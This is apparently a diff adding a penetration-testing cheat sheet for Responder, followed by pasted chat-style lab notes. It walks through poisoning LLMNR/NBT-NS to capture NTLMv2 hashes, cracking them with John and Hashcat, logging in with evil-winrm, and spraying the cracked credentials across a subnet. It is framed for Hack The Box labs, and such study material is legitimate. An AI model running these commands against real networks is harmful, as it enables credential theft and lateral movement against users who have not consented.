@@ -1,0 +1,329 @@
+================================================================================
+                    RESPONDER — MITM HASH CAPTURE REFERENCE
+================================================================================
+
+OVERVIEW
+--------
+Responder is a man-in-the-middle (MITM) tool that poisons name resolution
+protocols on local networks to capture NTLMv2 authentication hashes.
+
+When a device on the network tries to find a shared folder, printer, or
+internal hostname and gets no DNS answer, it falls back to broadcast
+protocols (LLMNR, NBT-NS, MDNS). Responder intercepts these broadcasts,
+pretends to be the requested server, and captures the authentication hash
+when the target tries to log in.
+
+Protocols exploited:
+  LLMNR      Link-Local Multicast Name Resolution
+  NBT-NS     NetBIOS Name Service
+  MDNS       Multicast DNS
+
+Hash captured: NTLMv2 challenge/response (not plaintext — must crack offline)
+
+================================================================================
+                    HOW RESPONDER WORKS — FLOW
+================================================================================
+
+  1. A target machine tries to resolve a hostname (e.g. \\fileserver\share)
+  2. DNS fails to resolve it — no answer
+  3. The machine falls back to LLMNR/NBT-NS broadcast on the local network
+  4. Responder hears the broadcast and responds: "That's me, connect here"
+  5. The target machine tries to authenticate with Responder's fake server
+  6. This triggers an NTLMv2 challenge/response authentication exchange
+  7. Responder captures the hash and saves it to a log file
+  8. You crack the hash offline with John or Hashcat to get the plaintext password
+
+  The captured hash looks like this:
+  Administrator::HTB:1122334455667788:aabbccddeeff...:::
+  [  username  ]   [domain][challenge][     response hash      ]
+
+  NOTE: Responder does NOT capture the plaintext password.
+        It captures a hashed version that you must crack separately.
+
+================================================================================
+                    STEP 1 — RUN RESPONDER
+================================================================================
+
+BASIC USAGE
+-----------
+
+  sudo responder -I <interface> | ex. sudo responder -I eth0
+
+  Example — listen on tun0 (VPN interface, common for HTB/TryHackMe):
+  sudo responder -I tun0
+
+  Example — listen on eth0 (local network interface):
+  sudo responder -I eth0
+
+  Example — listen on wlan0 (wireless interface):
+  sudo responder -I wlan0
+
+  NOTE: Find your interface name with: ip a
+
+COMMON FLAGS
+------------
+
+  -I <interface>     Network interface to listen on (required)
+  -w                 Enable WPAD rogue proxy server (captures browser auth)
+  -r                 Enable answers for NetBIOS wredir suffix queries
+  -d                 Enable answers for domain suffix queries
+  -v                 Verbose output — shows all requests including non-captured
+  -A                 Analyse mode — listen and log only, NO poisoning
+                     (use this for passive recon without affecting the network)
+  -F                 Force NTLM authentication on WPAD (more aggressive)
+  -P                 Force basic authentication on WPAD proxy
+
+  Example — full aggressive mode on a local network:
+  sudo responder -I eth0 -w -r -d -v
+
+  Example — passive listen only (no poisoning, safe for recon):
+  sudo responder -I eth0 -A
+
+WHAT YOU SEE WHEN IT WORKS
+---------------------------
+  Responder will print captured hashes directly to the terminal in real time:
+
+  [SMB] NTLMv2-SSP Client   : 10.129.53.43
+  [SMB] NTLMv2-SSP Username : HTB\Administrator
+  [SMB] NTLMv2-SSP Hash     : Administrator::HTB:1122334455667788:aabbccddeeff...
+
+================================================================================
+                    STEP 2 — LOCATE CAPTURED HASHES
+================================================================================
+
+Responder automatically saves all captured hashes to log files here:
+  /usr/share/responder/logs/
+
+Each log file is named by protocol and source IP:
+  SMB-NTLMv2-SSP-<IP>.txt        SMB authentication hashes
+  HTTP-NTLMv2-<IP>.txt           HTTP authentication hashes
+  FTP-Clear-<IP>.txt             FTP cleartext credentials (if captured)
+  POP3-Clear-<IP>.txt            POP3 cleartext credentials
+
+  List all captured logs:
+  ls /usr/share/responder/logs/
+
+  View a specific hash file:
+  cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.43.txt
+
+================================================================================
+                    STEP 3 — CRACK THE HASH
+================================================================================
+
+JOHN THE RIPPER (CPU-based)
+----------------------------
+
+  john --format=netntlmv2 --wordlist=<wordlist> <hashfile>
+
+  Example:
+  john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt \
+  /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.43.txt
+
+  With rules for more variations:
+  john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt \
+  /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.43.txt --rules
+
+  Show cracked password after completion:
+  john --show --format=netntlmv2 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.43.txt
+
+--------------------------------------------------------------------------------
+
+HASHCAT (GPU-accelerated — much faster)
+-----------------------------------------
+
+  hashcat -m 5600 <hashfile> <wordlist>
+
+  Example:
+  hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.43.txt \
+  /usr/share/wordlists/rockyou.txt
+
+  With rules:
+  hashcat -m 5600 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+  Flags:
+    -m 5600    NTLMv2 hash mode
+    -a 0       Dictionary attack (default)
+    --show     Display cracked results after completion
+
+  NOTE: Use Hashcat when John is too slow. GPU cracking is significantly
+        faster, especially for NTLMv2 which is computationally expensive.
+
+================================================================================
+                    FULL EXAMPLE — END TO END
+================================================================================
+
+  Scenario: Target machine on HTB network at 10.129.53.43 tries to access
+  a network share. Responder intercepts the authentication.
+
+  1. Start Responder:
+     sudo responder -I tun0
+
+  2. Wait for a target to make a network request...
+     Responder captures:
+     Administrator::HTB:1122334455667788:aabbccddeeff...:::
+
+  3. Hash is saved to:
+     /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.43.txt
+
+  4. Crack with John:
+     john --format=netntlmv2 \
+     --wordlist=/usr/share/wordlists/rockyou.txt \
+     /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.43.txt
+
+  5. John returns:
+     password123    (Administrator)
+
+  6. You now have valid credentials:
+     Username: Administrator
+     Password: password123
+
+  7. Use them to authenticate:
+     ssh Administrator@10.129.53.43
+     evil-winrm -i 10.129.53.43 -u Administrator -p password123
+
+================================================================================
+                    WHAT TO DO WITH CRACKED CREDENTIALS
+================================================================================
+
+Once you have a valid username and password, try:
+
+  SSH login:
+  ssh <username>@<TARGET_IP>
+
+  Windows Remote Management (WinRM):
+  evil-winrm -i <TARGET_IP> -u <username> -p <password>
+
+  SMB access:
+  smbclient \\\\<TARGET_IP>\\<share> -U <username>
+
+  Check for password reuse across other machines on the network:
+  crackmapexec smb 192.168.1.0/24 -u <username> -p <password>
+
+  NOTE: Credentials captured from one machine are often reused across
+        multiple systems — always test them broadly on the network.
+
+================================================================================
+                    QUICK REFERENCE
+================================================================================
+
+  Start Responder (active):      sudo responder -I tun0
+  Start Responder (passive):     sudo responder -I eth0 -A
+  Start Responder (aggressive):  sudo responder -I eth0 -w -r -d -v
+  View captured logs:            ls /usr/share/responder/logs/
+  Crack with John:               john --format=netntlmv2 --wordlist=rockyou.txt <hashfile>
+  Crack with Hashcat:            hashcat -m 5600 <hashfile> rockyou.txt
+  Show cracked (John):           john --show --format=netntlmv2 <hashfile>
+  Show cracked (Hashcat):        hashcat -m 5600 <hashfile> rockyou.txt --show
+
+================================================================================
+                              IMPORTANT NOTES
+================================================================================
+
+  - Responder only works on LOCAL networks — you must be on the same
+    subnet as the target. It will not work across the internet.
+
+  - Running Responder in active mode WILL affect the network — other
+    users may lose connectivity to resources. Use -A (analyse) mode
+    if you only want to observe without disrupting.
+
+  - On HTB/TryHackMe labs, always use tun0 (the VPN interface) as
+    your interface, not eth0 or wlan0.
+
+  - NTLMv2 hashes CANNOT be used in pass-the-hash attacks directly —
+    you must crack them to get the plaintext password first.
+    (NTLMv1 hashes CAN be used in pass-the-hash — different attack.)
+
+  - Only use Responder on networks you own or have explicit written
+    permission to test. Poisoning a corporate network is illegal.
+
+================================================================================
+
+
+
+🔧 What is Responder?
+Responder is a powerful man-in-the-middle (MITM) tool used to poison name resolution requests (like LLMNR, NBT-NS, and MDNS) in local networks. Its main goal is to capture authentication hashes (usually NTLMv2) when devices attempt to resolve names.
+
+🧪 What You Did with Responder
+bash
+Copy
+Edit
+sudo responder -I tun0
+-I tun0 specifies the network interface (tun0) to listen on.
+
+This command started Responder in active poisoning mode.
+
+It listened for LLMNR/NBT-NS requests and captured NTLMv2 hashes when a target tried to authenticate.
+
+🔓 Cracking Captured Hashes with John
+bash
+Copy
+Edit
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt SMB-NTLMv2-SSP-10.129.53.43.txt
+You used John the Ripper to crack the captured NetNTLMv2 hash.
+
+The rockyou.txt wordlist provided potential passwords.
+
+The --format=netntlmv2 flag tells John the hash format.
+
+Output gave you the plaintext password for the captured user.
+
+
+
+
+🕵️ How Did Responder Capture the Password?
+Responder doesn’t capture passwords in plaintext — it captures NTLMv2 challenge/response hashes used in authentication.
+
+🔄 The Flow:
+Your machine (with Responder running) poisoned the local network by spoofing services (like LLMNR/NBT-NS).
+
+A target machine on the network tried to resolve a hostname (e.g., accessing a shared folder or internal resource).
+
+Responder intercepted the request and pretended to be the requested server.
+
+The target machine tried to authenticate with what it thought was the legit server.
+
+That authentication triggered an NTLMv2 challenge/response exchange.
+
+Responder captured this hash, which looks something like this:
+
+cpp
+Copy
+Edit
+username::domain:challenge:response:::
+This hash is stored in:
+
+bash
+Copy
+Edit
+/usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt
+🔐 What Password Was Captured?
+The password wasn’t captured directly.
+
+What was captured was a NetNTLMv2 hash, which is a hashed version of the user's real password.
+
+You then used John the Ripper with a wordlist to brute force the hash until a matching password was found.
+
+John compared every word in rockyou.txt against the hash using the NTLMv2 algorithm.
+
+When it found a match, it gave you the actual password used by that target user.
+
+🧠 Example:
+Let's say Responder captured this hash:
+
+ruby
+Copy
+Edit
+Administrator::HTB:1122334455667788:aabbccddeeff...:::
+You then ran:
+
+bash
+Copy
+Edit
+john --format=netntlmv2 --wordlist=rockyou.txt SMB-NTLMv2-SSP-10.129.X.X.txt
+And John cracked it and returned:
+
+scss
+Copy
+Edit
+password123 (Administrator)
+So now you know the Administrator’s actual password was password123.
